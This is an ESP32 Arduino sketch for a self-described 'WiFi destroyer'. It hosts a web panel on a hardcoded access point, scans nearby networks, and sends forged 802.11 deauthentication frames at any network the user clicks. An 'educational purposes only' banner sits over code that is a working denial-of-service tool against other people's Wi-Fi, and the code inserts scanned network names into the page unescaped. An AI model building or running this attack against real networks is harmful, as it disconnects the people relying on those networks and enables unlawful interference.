#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <ESP32Ping.h>

// AP Credentials
const char* ssid = "bara";
const char* password = "A7med@Elshab7";

WebServer server(80);

// HTML Template
String getHtmlPage() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BARA - WiFi Hacker Tool</title>
  <style>
    body {
      background: #000;
      color: #ff0000;
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 0;
      overflow-x: hidden;
    }
    .blood-effect {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: repeating-linear-gradient(
        45deg,
        transparent,
        transparent 10px,
        rgba(255,0,0,0.05) 10px,
        rgba(255,0,0,0.05) 20px
      );
      z-index: -1;
      pointer-events: none;
    }
    .header {
      text-align: center;
      padding: 20px;
      border-bottom: 2px solid #ff0000;
      animation: pulse 1.5s infinite alternate;
    }
    @keyframes pulse {
      from { text-shadow: 0 0 5px #ff0000; }
      to { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000; }
    }
    .scan-btn, .deauth-btn {
      background: #ff0000;
      color: #000;
      border: none;
      padding: 12px 24px;
      margin: 10px;
      font-weight: bold;
      cursor: pointer;
      font-family: inherit;
      text-transform: uppercase;
      letter-spacing: 2px;
    }
    .scan-btn:hover, .deauth-btn:hover {
      background: #ff5555;
      box-shadow: 0 0 15px #ff0000;
    }
    table {
      width: 95%;
      margin: 20px auto;
      border-collapse: collapse;
      color: #ff5555;
    }
    th, td {
      border: 1px solid #ff0000;
      padding: 10px;
      text-align: center;
    }
    th {
      background-color: rgba(255,0,0,0.2);
    }
    .developer {
      text-align: center;
      font-size: 0.9em;
      margin-top: 40px;
      color: #800000;
    }
    audio {
      display: none;
    }
  </style>
</head>
<body>
  <div class="blood-effect"></div>
  <div class="header">
    <h1>☠️ BARA - ULTIMATE WIFI DESTROYER ☠️</h1>
    <p>By Ahmed Nour Ahmed from Qena</p>
  </div>

  <div style="text-align:center;">
    <button class="scan-btn" onclick="scan()">[ SCAN NETWORKS ]</button>
  </div>

  <div id="results"></div>

  <div class="developer">
    <marquee>⚠️ BARA TOOL - FOR EDUCATIONAL PURPOSES ONLY ⚠️</marquee>
  </div>

  <audio id="beep" src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNQ4qj9D314ArAi+M1fjWeSoEKovQ9956KgIqi9D34oE3Ci6FyvPVeSwDLoXJ89N6LQMuhcnz03ktAy6FyfPTeS0DL4XJ89J6LQIwhcnz03ktAy+FyfPSei0CMIXJ89N5LQMvhcnz0nktAjCFyfPTeS0DL4XJ89J5LQIwhcnz03ktAy+FyfPTeS0CMIXJ89N5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4......" preload="auto"></audio>

  <script>
    function scan() {
      const beep = document.getElementById('beep');
      beep.play().catch(e => console.log("Audio play failed:", e));
      fetch('/scan')
        .then(response => response.text())
        .then(html => {
          document.getElementById('results').innerHTML = html;
          applyEffects();
        });
    }

    function deauth(bssid, channel) {
      if (!confirm('Are you sure you want to DEAUTH this network?')) return;
      const beep = document.getElementById('beep');
      beep.play().catch(e => console.log("Audio play failed:", e));
      fetch(`/deauth?bssid=${bssid}&channel=${channel}`)
        .then(response => response.text())
        .then(msg => alert(msg));
    }

    function applyEffects() {
      const rows = document.querySelectorAll('tr');
      rows.forEach((row, i) => {
        row.style.animation = `fadeIn 0.5s ${i * 0.1}s forwards`;
        row.style.opacity = '0';
      });
    }

    document.addEventListener('DOMContentLoaded', () => {
      document.body.style.backgroundImage = "url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMwMDAiLz48dGV4dCB4PSIxMCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyMCIgZmlsbD0iI2ZmMDAwMCI+SEFDS0VEIEJZIEJBUkE8L3RleHQ+PC9zdmc+')";
    });
  </script>
</body>
</html>
)rawliteral";
  return html;
}

void handleRoot() {
  server.send(200, "text/html", getHtmlPage());
}

void handleScan() {
  int n = WiFi.scanNetworks();
  String response = "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Deauth</th></tr>";
  for (int i = 0; i < n; ++i) {
    String ssidStr = WiFi.SSID(i);
    if (ssidStr.length() == 0) ssidStr = "[Hidden]";
    String bssidStr = WiFi.BSSIDstr(i);
    int channel = WiFi.channel(i);
    int rssi = WiFi.RSSI(i);
    response += "<tr>";
    response += "<td>" + ssidStr + "</td>";
    response += "<td>" + bssidStr + "</td>";
    response += "<td>" + String(channel) + "</td>";
    response += "<td>" + String(rssi) + " dBm</td>";
    response += "<td><button class='deauth-btn' onclick=\"deauth('" + bssidStr + "'," + String(channel) + ")\">[DEAUTH]</button></td>";
    response += "</tr>";
  }
  if (n == 0) {
    response += "<tr><td colspan='5'>No networks found.</td></tr>";
  }
  response += "</table>";
  server.send(200, "text/html", response);
}

void handleDeauth() {
  String bssid = server.arg("bssid");
  int channel = server.arg("channel").toInt();

  if (bssid.length() != 17 || channel < 1 || channel > 14) {
    server.send(400, "text/plain", "Invalid BSSID or Channel");
    return;
  }

  // Start deauth attack (limited to 10 deauth frames for safety/demo)
  uint8_t bssidBytes[6];
  if (sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &bssidBytes[0], &bssidBytes[1], &bssidBytes[2],
             &bssidBytes[3], &bssidBytes[4], &bssidBytes[5]) != 6) {
    server.send(400, "text/plain", "Invalid BSSID format");
    return;
  }

  // Switch to the target channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Craft deauth frame
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, // Type: Deauth
    0x00, 0x00, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (spoofed as target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (target)
    0x00, 0x00, // Sequence
    0x01, 0x00  // Reason: Unspecified
  };
  memcpy(deauthPacket + 10, bssidBytes, 6);
  memcpy(deauthPacket + 16, bssidBytes, 6);

  // Send 10 deauth frames
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(100);
  }

  server.send(200, "text/plain", "Deauth attack sent to " + bssid + " on channel " + String(channel) + "!");
}

void setup() {
  Serial.begin(115200);
  
  // Set WiFi to AP mode + STA for scanning
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ssid, password);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));

  // Routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/deauth", HTTP_GET, handleDeauth);

  server.begin();
  Serial.println("BARA Tool Ready! Connect to AP: bara / A7med@Elshab7");
}

void loop() {
  server.handleClient();
}
